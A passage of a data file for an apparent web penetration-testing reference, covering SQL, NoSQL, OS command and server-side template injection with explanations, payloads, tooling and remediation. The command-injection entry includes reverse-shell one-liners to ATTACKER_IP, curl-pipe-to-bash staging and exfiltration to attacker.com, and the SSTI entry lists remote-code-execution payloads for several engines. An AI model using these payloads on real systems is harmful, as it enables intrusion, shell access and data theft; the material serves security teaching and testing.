              { label: "Tune detection & evade", cmd: "sqlmap -r request.txt --technique=BEUST      # restrict/expand techniques\nsqlmap -r request.txt --tamper=between,space2comment --random-agent\nsqlmap -r request.txt --delay 1 --time-sec 5  # go slow to dodge rate limits" },
              { label: "Escalate (authorised engagements only)", cmd: "sqlmap -r request.txt --is-dba --privileges\nsqlmap -r request.txt --file-read=/etc/passwd\nsqlmap -r request.txt --os-shell        # MSSQL xp_cmdshell / MySQL UDF / PG\n# stop at a screenshot-worthy proof unless full exploitation is in scope" }
            ]
          },
          {
            title: "Beyond Data — Files & RCE",
            type: "table",
            columns: ["DBMS", "Read file", "Write file / RCE path"],
            rows: [
              ["MySQL", "LOAD_FILE('/etc/passwd')", "SELECT '<?php ...?>' INTO OUTFILE '/var/www/shell.php' (needs FILE priv + secure_file_priv unset)"],
              ["MSSQL", "OPENROWSET(BULK ...)", "EXEC xp_cmdshell 'whoami' (if enabled); re-enable via sp_configure if sysadmin"],
              ["PostgreSQL", "pg_read_file('/etc/passwd')", "COPY ... FROM PROGRAM 'cmd' (superuser), or a C/plperlu function"],
              ["Oracle", "UTL_FILE package", "DBMS_SCHEDULER / Java stored procedures for command execution"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Find an injectable parameter", "Confirmed SQLi point"],
              ["2", "Fingerprint DBMS + injection type + column count", "A working extraction technique"],
              ["3", "Enumerate schema, dump users/hashes/PII", "Sensitive data / auth bypass"],
              ["4", "Crack hashes or use plaintext creds", "Application / admin access"],
              ["5", "If DBA: read/write files, xp_cmdshell / OUTFILE", "RCE on the DB host, pivot inward"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["sqlmap", "Automated detection, extraction, tamper-based WAF evasion, and OS/file takeover"],
              ["ghauri", "Fast alternative to sqlmap, strong on blind/time-based"],
              ["Burp Suite", "Manual probing, capturing the request, Intruder for boolean/char extraction"],
              ["Burp Collaborator / interactsh", "Catch out-of-band DNS/HTTP callbacks for OAST injection"],
              ["hashcat / John", "Crack password hashes recovered from the dump"]
            ]
          },
          {
            title: "Common Pitfalls & False Positives",
            type: "notes",
            items: [
              "A 500 error on a single quote is a hint, not proof — always confirm with a boolean pair (AND 1=1 vs AND 1=2) or a differential/time test so you are not chasing a generic input-handling error.",
              "WAFs and rate limiters can make blind extraction look broken: a delayed page might be network jitter, not your SLEEP. Repeat time-based tests and compare against a 0-second baseline.",
              "Client-side or length filters may strip your comment or quote before it reaches the DB; check the actual bytes that arrive (proxy the request) rather than trusting the browser.",
              "In numeric contexts a quote is unnecessary and can even break an otherwise-working payload — try both quoted and unquoted forms.",
              "Some frameworks silently coerce or cast types (e.g. a non-numeric id becomes 0), producing a changed response that is not injection — verify with arithmetic (3-1) rather than assuming.",
              "Escaping a quote (\\') is not safe on MySQL if the connection charset allows multi-byte tricks (GBK) — but modern stacks are mostly immune; do not report it without a working proof."
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "PortSwigger — SQL injection (with labs)", url: "https://portswigger.net/web-security/sql-injection" },
              { label: "PortSwigger — SQLi cheat sheet (per-DBMS syntax)", url: "https://portswigger.net/web-security/sql-injection/cheat-sheet" },
              { label: "OWASP — SQL Injection Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" },
              { label: "OWASP WSTG — Testing for SQL Injection", url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection" },
              { label: "PayloadsAllTheThings — SQLi", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Use parameterised queries / prepared statements for every query, without exception — this is the one fix that actually works because it sends code and data to the database separately.",
              "Java: use PreparedStatement with ? placeholders (never Statement + string concatenation). PHP: PDO with prepare()/execute() and real bound parameters (not emulated). Python: pass params as the second argument to cursor.execute(query, (val,)), never %-format the SQL. Node: parameterised queries ($1, ? placeholders), never template-literal SQL.",
              "Use an ORM's query builder correctly, and treat every raw-query escape hatch (e.g. .raw(), sequelize.query, EF FromSqlRaw) as a manual concatenation risk that must be parameterised.",
              "For structural elements that cannot be bound (ORDER BY columns, table names, ASC/DESC), validate against a strict server-side allow-list of known-good values — never pass user text through.",
              "Apply least privilege to the database account: no FILE/OUTFILE, no xp_cmdshell, not a DBA/superuser, and only the specific tables the app needs, so that even a successful injection cannot become RCE.",
              "Add defence-in-depth — input validation, a tuned WAF, and disabling detailed DB error messages in production — but never rely on these instead of parameterisation, as every one of them can be bypassed.",
              "Add regression tests and use static analysis / SAST to catch new string-concatenated queries before they ship."
            ]
          }
        ]
      },
      {
        id: "nosqli",
        name: "NoSQL Injection",
        severity: "High",
        ref: "https://portswigger.net/web-security/nosql-injection",
        description: "Operator or JavaScript injection into a NoSQL query (typically MongoDB), enabling authentication bypass and data extraction.",
        brief: "NoSQL databases are not immune to injection — they simply have a different query model, and mistakes in it are just as exploitable. The most common case is MongoDB with a JavaScript/JSON back-end (Node/Express, PHP, Python). When user input is placed into a query object without validating its type, an attacker can send a query OPERATOR object where the code expected a plain string, changing the query's logic. The signature example turns { user: 'admin', pass: 'x' } into { user: 'admin', pass: { $ne: 'x' } } — 'password not equal to x', true for any real password — logging in without knowing the password.\n\nThere are two sub-classes. Operator injection (above) manipulates the query with operators like $ne, $gt, $regex, $in, and $exists — enabling authentication bypass and, via $regex, blind character-by-character extraction of secrets. Syntax/JavaScript injection targets features that evaluate JavaScript server-side ($where, mapReduce, group), which can lead to logic bypass, denial of service, or, on misconfigured servers, code execution.\n\nA crucial delivery detail: many frameworks parse bracketed query/body parameters into nested objects (Express/qs and PHP turn user[$ne]=x into { user: { $ne: 'x' } }), so operator injection is reachable even through ordinary form and URL parameters, not just JSON APIs. It is common precisely because developers assume 'NoSQL' means 'no injection'.",
        quickReference: [
          { label: "Auth bypass (JSON body)", cmd: "{\"user\":\"admin\",\"pass\":{\"$ne\":\"x\"}}" },
          { label: "Auth bypass (form / URL)", cmd: "user[$ne]=x&pass[$ne]=x   or   user[$gt]=&pass[$gt]=" },
          { label: "Blind extraction", cmd: "pass[$regex]=^a   ^b   ^c ...  (walk each character)" },
          { label: "JS injection", cmd: "{\"$where\":\"sleep(5000)\"}   detect via time delay" }
        ],
        sections: [
          {
            title: "Root Cause & Concepts",
            type: "notes",
            items: [
              "MongoDB queries are documents (objects), and operators are keys beginning with $. If user input becomes a value in that object unchecked, the attacker can supply an object ({\"$ne\":null}) where a string was expected, injecting query logic.",
              "The core defect is a type-confusion: the app assumes password is a string, but the request delivers an object — so the query means something the developer never wrote.",
              "Framework body parsers make this reachable from ordinary parameters: Express (qs) and PHP expand param[$ne]=x into a nested object automatically, so you do not need a JSON endpoint.",
              "Operator injection changes comparisons and matching; JavaScript injection ($where, mapReduce, group with a function) evaluates attacker JS server-side — a heavier, rarer, but more dangerous sink.",
              "Because responses often differ on match/no-match, $regex gives a boolean oracle for blind extraction even when no data is directly returned."
            ]
          },
          {
            title: "Where to Look",
            type: "notes",
            items: [
              "Login and lookup endpoints that take a username/email + password or an id — the classic auth-bypass target.",
              "Search, filter, and sort parameters that feed a Mongo find() query, especially JSON APIs.",
              "Any endpoint on a Node/Express, PHP, or Python stack backed by MongoDB (or CouchDB, etc.).",
              "Form and URL parameters, not just JSON — test the bracket-notation operator form (param[$ne]=x).",
              "Features that hint at server-side JS: aggregation with $where, saved 'expressions', or reporting/rules engines."
            ]
          },
          {
            title: "Step 1 — Detect & Bypass Auth",
            type: "commands",
            commands: [
              { label: "Send an operator instead of a value (JSON)", cmd: "# change the login body from strings to an operator object:\n{\"user\":\"admin\",\"pass\":{\"$ne\":\"x\"}}\n{\"user\":{\"$ne\":null},\"pass\":{\"$ne\":null}}\n{\"user\":\"admin\",\"pass\":{\"$gt\":\"\"}}\n# any of these that logs you in = operator injection" },
              { label: "Form / URL variant (bracket notation)", cmd: "curl 'https://target/login' -d 'user[$ne]=x&pass[$ne]=x'\ncurl 'https://target/login' -d 'user=admin&pass[$gt]='\n# the parser builds { pass: { $gt: '' } } server-side" },
              { label: "Break the query to detect (error-based)", cmd: "# inject characters that break Mongo/JS string context:\nusername='   \"   {   ;   $\n# a 500 or changed behaviour hints the input reaches the query unescaped" },
              { label: "Target a specific account", cmd: "# log in as admin specifically:\n{\"user\":\"admin\",\"pass\":{\"$ne\":\"wrong\"}}\n# or with $in to try many users:\n{\"user\":{\"$in\":[\"admin\",\"root\"]},\"pass\":{\"$ne\":\"\"}}" }
            ]
          },
          {
            title: "Step 2 — Blind Extraction & JS Injection",
            type: "commands",
            commands: [
              { label: "$regex character-by-character", cmd: "# find the response difference for match vs no-match, then walk the secret:\npass[$regex]=^a   # no change (false)\npass[$regex]=^s   # changed (true) -> first char 's'\npass[$regex]=^se  ^sec  ^secr ...   # continue to full value\n# anchor with ^ and $ ; escape regex metacharacters in known parts" },
              { label: "Enumerate with $where / boolean", cmd: "# where $where is built from input:\n{\"$where\":\"this.password.length > 10\"}   # true/false oracle on length\n{\"$where\":\"this.password[0]=='s'\"}         # char oracle" },
              { label: "Time-based JS oracle (blind)", cmd: "# no visible difference? use a delay:\n{\"$where\":\"if(this.user=='admin'&&this.password[0]=='s'){sleep(3000)}\"}\n# a ~3s delay confirms the condition" },
              { label: "Automate", cmd: "nosqli scan -t 'https://target/search?q=test'\nnosqli scan -t https://target/login -r POST -d '{\"user\":\"a\",\"pass\":\"b\"}'\n# or script the $regex walk with requests + a match/no-match check" }
            ]
          },
          {
            title: "Operators Abused",
            type: "table",
            columns: ["Operator", "Effect"],
            rows: [
              ["$ne", "'not equal' -> true for any real value -> auth bypass"],
              ["$gt / $lt / $gte", "Range comparisons that evaluate always-true (e.g. $gt:'')"],
              ["$regex", "Pattern match -> blind character-by-character extraction"],
              ["$in / $nin", "Match any/none of a list -> try multiple usernames at once"],
              ["$exists", "Test whether a field is present"],
              ["$where", "Server-side JavaScript -> logic bypass, DoS, possible code execution"]
            ]
          },
          {
            title: "Impact & Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Send an operator/object where a value is expected", "Confirmed injection / auth bypass"],
              ["2", "Bypass login as admin", "Authenticated access"],
              ["3", "Use $regex / $where oracle", "Blind extraction of passwords, tokens, data"],
              ["4", "Reach $where / mapReduce if present", "Server-side JS execution / DoS"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["nosqli", "Maintained NoSQL (MongoDB) injection scanner"],
              ["Burp Suite", "Manual operator injection; convert strings to objects, test bracket notation"],
              ["NoSQLMap", "Automated MongoDB enumeration and injection (legacy but useful)"],
              ["custom scripts", "Automate the $regex/time-based blind extraction walk"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "PortSwigger — NoSQL injection (with labs)", url: "https://portswigger.net/web-security/nosql-injection" },
              { label: "OWASP WSTG — Testing for NoSQL Injection", url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection" },
              { label: "PayloadsAllTheThings — NoSQL Injection", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Validate input types strictly on the server: reject objects and arrays where a scalar string is expected — a username or password must never be allowed to arrive as an object.",
              "Cast user input to the expected type before it reaches the query (String(input)); with Mongoose, define and enforce a schema so type coercion is automatic.",
              "Disable the framework's automatic conversion of bracketed parameters into nested objects, or sanitise keys beginning with $ and . (e.g. express-mongo-sanitize).",
              "Disable server-side JavaScript evaluation ($where, mapReduce, group-with-function) unless genuinely required, and never build such expressions from user input.",
              "Use the driver's/ODM's query builders and parameterised query construction rather than passing raw user-controlled objects into find().",
              "Apply least privilege to the DB account and never expose the database to the network unauthenticated."
            ]
          }
        ]
      },
      {
        id: "command-injection",
        name: "OS Command Injection",
        severity: "Critical",
        ref: "https://portswigger.net/web-security/os-command-injection",
        description: "User input reaches a system shell command, letting an attacker run arbitrary commands on the server.",
        brief: "OS command injection occurs when an application constructs an operating-system command from user-controlled input and hands it to a shell (system(), exec, popen, backticks, Runtime.exec with sh -c, child_process.exec). Because the shell parses metacharacters — ; | & && || ` $() newline — before executing, an attacker who controls any part of that string can terminate the intended command and append their own, or substitute a sub-command inline. Every injected command runs with the privileges of the web process.\n\nIt is distinct from code injection (which runs code in the app's own language) and from argument injection (where you cannot add a new command but can smuggle extra flags into the existing binary to change its behaviour — e.g. adding an output-file flag to a converter). Both are covered here because testers meet them together.\n\nConsequences are as severe as it gets: read application secrets and the filesystem, establish an interactive reverse shell, move laterally to internal services the host can reach, and ultimately take full control of the server. Command injection hides wherever an app shells out to do work it could not easily do in-language: ping/traceroute/nslookup diagnostics, DNS and whois lookups, image/PDF/video conversion (ImageMagick, ffmpeg, ghostscript), archive handling (zip/tar/unzip), git operations, backup and export routines, and antivirus or document-processing pipelines.",
        quickReference: [
          { label: "Command separators", cmd: "; id    | id    & id    && id    || id    %0a id    %0d%0a id" },
          { label: "Inline substitution (works inside quotes)", cmd: "$(id)    `id`    ${IFS}   (space-free)" },
          { label: "Blind out-of-band confirm", cmd: "& nslookup `whoami`.attacker.oastify.com &" },
          { label: "Blind time-based", cmd: "& ping -c 10 127.0.0.1 &    ; sleep 10    & timeout 10 &  (Windows)" }
        ],
        sections: [
          {
            title: "Root Cause & Mechanism",
            type: "notes",
            items: [
              "The app passes a string to a shell interpreter (/bin/sh -c \"...\" or cmd.exe /c \"...\"). The shell — not the app — parses that string, and it treats metacharacters as control operators, so attacker data becomes attacker commands.",
              "The dangerous pattern is a shell-invoking API given a single command string: PHP system/exec/shell_exec/passthru/backticks, Python os.system / subprocess with shell=True, Node child_process.exec, Java Runtime.getRuntime().exec(\"sh -c \"+x), Ruby system(\"...#{x}\") / backticks.",
              "The safe pattern is an exec API that takes the program and an argv array with no shell: subprocess.run([\"ping\",\"-c\",\"1\",host]) , execFile('ping',['-c','1',host]) , ProcessBuilder(\"ping\",\"-c\",\"1\",host). No shell means no metacharacter parsing.",
              "Argument injection is a subtler variant: even without a separator, if your value becomes an argument you may inject extra flags (a leading - ) that change the binary's behaviour — e.g. turning a filename into an output-file or config option.",
              "Results-based injection returns command output in the response; blind injection returns nothing, so you confirm via a time delay or an out-of-band callback instead."
            ]
          },
          {
            title: "Where to Look",
            type: "notes",
            items: [
              "Network diagnostic tools: ping, traceroute, nslookup, dig, whois, host — the textbook sink, and still common in router/IoT/admin panels.",
              "Media & document processing: image thumbnailers and converters (ImageMagick 'ImageTragick', ghostscript), PDF generation, ffmpeg, LibreOffice/unoconv, OCR.",
              "File operations: archive extract/create (zip, tar, unzip, 7z), file-type detection, virus scanning, backup/restore, log processing.",
              "DevOps-flavoured features: git clone/pull of a user-supplied URL, running build or deploy scripts, 'test connection' buttons, SSRF-adjacent fetchers that shell out to curl/wget.",
              "Any parameter that ends up as a filename, hostname, URL, or path in a shelled-out command — including values arriving via headers, filenames of uploads, and stored fields used later."
            ]
          },
          {
            title: "Step 1 — Detect Command Execution",
            type: "commands",
            commands: [
              { label: "Results-based: append a command and read the output", cmd: "# original: ping -c 1 <host>\nhost=127.0.0.1;id\nhost=127.0.0.1|id\nhost=127.0.0.1&&id\nhost=127.0.0.1`id`\nhost=127.0.0.1$(id)\n# uid=... in the response = confirmed execution" },
              { label: "Blind time-based (most reliable)", cmd: "# unix\nhost=127.0.0.1;sleep 10\nhost=127.0.0.1&ping -c 10 127.0.0.1&\n# windows\nhost=127.0.0.1&ping -n 10 127.0.0.1&\nhost=127.0.0.1&timeout 10&\n# a ~10s delay vs an instant baseline = injection" },
              { label: "Blind out-of-band (confirms AND exfiltrates)", cmd: "# fire a DNS/HTTP lookup to a listener you control (Collaborator/interactsh)\nhost=127.0.0.1&nslookup `whoami`.oob.attacker.com&\nhost=127.0.0.1&curl http://oob.attacker.com/$(id|base64)&\n# the callback subdomain/path carries the command output" },
              { label: "Try every context & separator", cmd: "# if the value is quoted in the command, break out first:\n\" ; id ;\"      ' ; id ;'\n# newline injection when the parser is line-based:\nhost=127.0.0.1%0aid" }
            ]
          },
          {
            title: "Step 2 — Space & Filter Bypass",
            type: "commands",
            commands: [
              { label: "No spaces allowed", cmd: "# ${IFS} is the shell's internal field separator (a space)\ncat${IFS}/etc/passwd\ncat$IFS$9/etc/passwd\n# brace expansion needs no spaces:\n{cat,/etc/passwd}\n# tab or newline instead of space:\ncat%09/etc/passwd" },
              { label: "Keyword/blocklist evasion", cmd: "# quotes and concatenation break signature matching but the shell ignores them:\nc\"a\"t /etc/passwd     ca''t /etc/passwd\nwho$@ami            /bin/c?t /etc/passwd   (glob)\n# base64 the whole command:\necho Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh" },
              { label: "Avoid blocked slashes / paths", cmd: "# build / from a variable:\ncat ${HOME:0:1}etc${HOME:0:1}passwd\n# or use IFS/glob tricks to reach files without literal slashes" },
              { label: "Windows-specific", cmd: "# separators: & && | \n# variable insertion breaks signatures: wh^oami   who^ami\n# powershell base64: powershell -enc <b64-utf16le>" }
            ]
          },
          {
            title: "Injection Contexts",
            type: "table",
            columns: ["Context in the command", "How to break out / inject"],
            rows: [
              ["Unquoted argument", "Any separator works: ; | & && || newline"],
              ["Inside double quotes \"...$x...\"", "$(cmd) and `cmd` still execute; or close with \""],
              ["Inside single quotes '...$x...'", "Metacharacters are literal — close the quote first: ' then payload then '"],
              ["Line-based parser", "%0a (newline) starts a fresh command line"],
              ["Value becomes a flag/filename", "Argument injection: prefix with - to add options (no separator needed)"],
              ["Windows cmd.exe", "& && | separators; ^ escapes to defeat filters"]
            ]
          },
          {
            title: "Step 3 — Exploit: Shell & Exfiltration",
            type: "commands",
            commands: [
              { label: "Interactive reverse shell (authorised only)", cmd: "; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'\n; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",443));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'\n# listener: nc -lvnp 443   (upgrade the tty with script/pty afterwards)" },
              { label: "Blind: exfiltrate output over DNS/HTTP", cmd: "# when you cannot see stdout, ship it out-of-band\n& curl -s http://oob.attacker.com/$(id | base64 -w0) &\n& for c in $(id); do nslookup $c.oob.attacker.com; done &" },
              { label: "Stage a fuller shell", cmd: "# pull and run a script when curl/wget is available\n; curl -s http://ATTACKER/x.sh | bash\n; wget -qO- http://ATTACKER/x.sh | sh" },
              { label: "Argument-injection example", cmd: "# a 'convert' feature: convert <userfile> out.png\n# supply a value starting with - to smuggle an option, or abuse tool-specific\n# flags (e.g. gnuplot -e, tar --checkpoint-action=exec) to gain execution" }
            ]
          },
          {
            title: "Step 4 — Automate with Commix",
            type: "commands",
            commands: [
              { label: "Point at a parameter", cmd: "commix -u 'https://target/tools/ping?host=127.0.0.1'\ncommix -u 'https://target/ping' --data='host=127.0.0.1' -p host" },
              { label: "From a captured request", cmd: "commix -r request.txt --level 3" },
              { label: "Get a shell / tune technique", cmd: "commix -u '...' --os-cmd='id'          # single command\ncommix -u '...' --os-shell             # pseudo-shell\ncommix -u '...' --technique=t           # t=time-based, f=file-based, etc." }
            ]
          },
          {
            title: "Impact & Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Find a shell-adjacent feature", "Candidate injection point"],
              ["2", "Confirm via output / delay / OOB", "Verified command execution as the web user"],
              ["3", "Read secrets (env, config, keys)", "Credentials for DBs, cloud, internal APIs"],
              ["4", "Establish a reverse shell", "Interactive foothold on the host"],
              ["5", "Privilege-escalate + pivot", "Root on the box, access to the internal network"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Commix", "Automated command-injection detection and exploitation (incl. blind)"],
              ["Burp Suite + Collaborator", "Manual probing and blind out-of-band detection"],
              ["interactsh / OAST", "Catch DNS/HTTP callbacks for blind confirmation and exfil"],
              ["netcat / socat", "Reverse-shell listener and tty upgrade"],
              ["GTFOBins", "Reference for turning an allowed binary into execution/priv-esc"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "PortSwigger — OS command injection (with labs)", url: "https://portswigger.net/web-security/os-command-injection" },
              { label: "OWASP WSTG — Testing for Command Injection", url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection" },
              { label: "OWASP — OS Command Injection Defense Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html" },
              { label: "PayloadsAllTheThings — Command Injection", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Do not invoke a shell at all where you can avoid it — use a native language API instead of shelling out (a DNS resolver library instead of nslookup, an image library instead of calling convert).",
              "When you must run an external binary, use the array/exec form that bypasses the shell and passes arguments as a list: subprocess.run([...], shell=False), child_process.execFile, ProcessBuilder, pcntl_exec — never build a single command string.",
              "Never place user input in the command name or as raw arguments; where a value is required, validate it against a strict server-side allow-list (e.g. a fixed set of hostnames, or a numeric/charset pattern), and reject everything else.",
              "Guard against argument injection by prefixing user values with -- (end-of-options) where the tool supports it, and by validating that a value cannot begin with - when it must not be a flag.",
              "Run the web process as an unprivileged user, in a container or with seccomp/AppArmor, so a successful injection is contained rather than instant root.",
              "Do not rely on a WAF or blacklisting metacharacters — the space/keyword bypasses above defeat that; fix the call site."
            ]
          }
        ]
      },
      {
        id: "ssti",
        name: "Server-Side Template Injection (SSTI)",
        severity: "Critical",
        ref: "https://portswigger.net/web-security/server-side-template-injection",
        description: "User input is evaluated by a server-side template engine, often escalating to remote code execution.",
        brief: "Server-Side Template Injection occurs when user input is concatenated into a template that a server-side engine then evaluates, so the input is parsed as template syntax rather than treated as data to be rendered. Template engines (Jinja2, Twig, Freemarker, Velocity, ERB, Smarty, Handlebars, Pug, and many more) are effectively small programming languages, so control over the template usually means control over that language — and from there, over the host process.\n\nThe critical distinction from XSS is where the code runs: XSS executes in the victim's browser, while SSTI executes on the server. A payload like {{7*7}} that comes back as 49 proves the server evaluated your input. From that foothold, most engines expose a documented path from the template sandbox down to the underlying language's object model, and from there to os/Runtime and command execution. Even engines marketed as 'sandboxed' have a long history of escape gadgets.\n\nSSTI is increasingly common because modern apps build HTML pages, emails, PDFs, invoices, and notification messages from templates whose fields (a name, a subject line, a profile bio, a filename) are user-controlled. Impact ranges from reading server-side context and secrets, through arbitrary file access, up to full remote code execution — which is why a confirmed SSTI is treated as critical even before RCE is demonstrated.",
        quickReference: [
          { label: "Detection probes", cmd: "{{7*7}}   ${7*7}   <%= 7*7 %>   #{7*7}   {7*7}   ${{7*7}}   #{7*7}  -> look for 49" },
          { label: "Distinguish Jinja2 vs Twig", cmd: "{{7*'7'}}  ->  7777777 (Jinja2/Python)  or  49 (Twig/PHP)" },
          { label: "Jinja2 RCE", cmd: "{{ cycler.__init__.__globals__.os.popen('id').read() }}" },
          { label: "Automate", cmd: "python3 sstimap.py -u 'https://target/page?name=x' --os-shell" }
        ],
        sections: [
          {
            title: "Root Cause & Mechanism",
            type: "notes",
            items: [
              "The dangerous pattern is building the template text from input: render('Hello '+name) or Template('Hi '+name).render(). The engine compiles that combined string, so name is executed as template code.",
              "The safe pattern passes input as a context variable to a fixed template: render('hello.html', name=name) — the engine escapes/quotes the value and never parses it as syntax.",
              "Because template languages expose object attributes, filters, and function calls, an attacker who can write expressions can usually reach the host language's built-ins (Python's __globals__/__builtins__, Java reflection, Ruby's Kernel) and call into os/Runtime.",
              "SSTI often masquerades as XSS at first glance: if your HTML/JS reflects but {{7*7}} does NOT evaluate, it is XSS; if 7*7 becomes 49 server-side, it is SSTI (and may be both).",
              "The engine may run inside a sandbox that blocks obvious gadgets; escapes work by pivoting through allowed objects to forbidden ones (subclass walking, __mro__, gadget chains)."
            ]
          },
          {
            title: "Where to Look",
            type: "notes",
            items: [
              "Anywhere the app generates text from a template with a user-supplied field: welcome/notification emails, password-reset messages, personalised pages, PDF/invoice/report generation, and error pages that echo input.",
              "Content-management and 'custom template'/'email template' features where users legitimately edit templates — often SSTI by design if not sandboxed.",
              "Fields that feel innocuous: display name, subject line, filename, address, comment, and any value reflected into a rendered document.",
              "Marketing/CRM and low-code tools that let users embed merge tags or expressions.",
              "Note the reflection first, then test whether it is evaluated (SSTI) or merely inserted (XSS)."
            ]
          },
          {
            title: "Step 1 — Detect & Fingerprint",
            type: "commands",
            commands: [
              { label: "Fire polyglot math probes", cmd: "# try each syntax in every reflected field; a numeric result (49) = SSTI\n{{7*7}}      # Jinja2, Twig, Nunjucks\n${7*7}       # Freemarker, Velocity, JSP EL\n<%= 7*7 %>   # ERB (Ruby)\n#{7*7}       # Ruby string interp, Slim, Pug\n{7*7}        # Smarty\n${{7*7}}  @(7*7)  {{=7*7}}   # other engines" },
              { label: "Distinguish look-alikes", cmd: "# {{7*7}} -> 49 could be Jinja2 or Twig; disambiguate:\n{{7*'7'}}  ->  7777777  = Jinja2 (Python string repeat)\n{{7*'7'}}  ->  49       = Twig (numeric)\n# {{7*7}} not evaluated but {%7*7%} or ${7*7} is -> different family" },
              { label: "Use the PortSwigger decision probe", cmd: "# escalate a generic ${{<%[%'\"}}%\\  and observe which errors/renders,\n# then follow the fingerprint down to the exact engine before crafting RCE" }
            ]
          },
          {
            title: "Step 2 — Escalate to RCE by Engine",
            type: "commands",
            commands: [
              { label: "Jinja2 / Python", cmd: "# enumerate reachable classes, then call os\n{{ ''.__class__.__mro__[1].__subclasses__() }}\n{{ cycler.__init__.__globals__.os.popen('id').read() }}\n{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}\n{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}  (Flask)" },
              { label: "Twig / PHP", cmd: "{{ ['id']|filter('system') }}\n{{ ['id',1]|sort('system') }}\n{{ _self.env.registerUndefinedFilterCallback('exec') }}{{ _self.env.getFilter('id') }}" },
              { label: "Freemarker / Velocity (Java)", cmd: "# Freemarker\n<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}\n# Velocity\n#set($e='e');$e.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id')" },
              { label: "ERB / Ruby, Smarty / PHP", cmd: "# ERB\n<%= system('id') %>   <%= `id` %>   <%= IO.popen('id').read %>\n# Smarty\n{system('id')}   {php}system('id');{/php}   {Smarty_Internal_Write_File::writeFile(...)}" },
              { label: "Node (Nunjucks / Handlebars / Pug)", cmd: "# Nunjucks\n{{ range.constructor('return global.process.mainModule.require(\\'child_process\\').execSync(\\'id\\')')() }}\n# Pug\n#{ global.process.mainModule.require('child_process').execSync('id') }" }
            ]
          },
          {
            title: "Engine Fingerprint",
            type: "table",
            columns: ["Rendered probe", "Likely engine(s)", "Language"],
            rows: [
              ["{{7*7}} → 49", "Jinja2, Twig, Nunjucks", "Python / PHP / Node"],
              ["{{7*'7'}} → 7777777", "Jinja2", "Python"],
              ["{{7*'7'}} → 49", "Twig", "PHP"],
              ["${7*7} → 49", "Freemarker, Velocity, JSP EL", "Java"],
              ["<%= 7*7 %> → 49", "ERB", "Ruby"],
              ["{7*7} → 49", "Smarty", "PHP"],
              ["#{7*7} → 49", "Pug, Slim, Ruby interp", "Node / Ruby"]
            ]
          },
          {
            title: "Sandbox Escapes & Filter Bypass",
            type: "notes",
            items: [
              "Attribute-access filters (blocking __ or .) are bypassed with brackets and request args: obj['__class__'] , or {{ request['application'] }} ; Jinja2 also has attr() and |attr('__class__').",
              "When keywords like os or popen are filtered, build them from concatenation or hex/char, or reach them via a different gadget (subprocess, importlib, __import__).",
              "Sandboxed Jinja2 (SandboxedEnvironment) still falls to gadget chains through allowed globals like cycler, joiner, namespace, lipsum, and request.",
              "Twig sandbox is escaped via _self and registerUndefinedFilterCallback; Freemarker via ?new() on utility classes unless the resolver is restricted.",
              "If direct RCE is blocked, SSTI still yields file read, secret disclosure from the render context (config, request, environment), and SSRF — report those even when the sandbox holds."
            ]
          },
          {
            title: "Step 3 — Automate with SSTImap",
            type: "commands",
            commands: [
              { label: "Detect", cmd: "python3 sstimap.py -u 'https://target/greet?name=test'\npython3 sstimap.py -u 'https://target/greet' -d 'name=test' -p name" },
              { label: "From a captured request", cmd: "python3 sstimap.py -r request.txt" },
              { label: "Execute / shell", cmd: "python3 sstimap.py -u '...' --os-cmd 'id'\npython3 sstimap.py -u '...' --os-shell\npython3 sstimap.py -u '...' --eval-command \"...\"    # in-template eval" }
            ]
          },
          {
            title: "Impact & Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Reflect a math probe (7*7 → 49)", "Confirmed server-side evaluation"],
              ["2", "Fingerprint the exact engine", "Correct escape chain selected"],
              ["3", "Read render context / files", "Secrets, config, source disclosure"],
              ["4", "Escape sandbox to language internals", "Access to os / Runtime / child_process"],
              ["5", "Execute OS commands / reverse shell", "RCE on the server, then pivot"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["SSTImap", "Detect and exploit SSTI to RCE across many engines"],
              ["tplmap (legacy)", "Older automation; SSTImap is the maintained successor"],
              ["Burp Suite", "Manual probing, reflection analysis, distinguishing SSTI from XSS"],
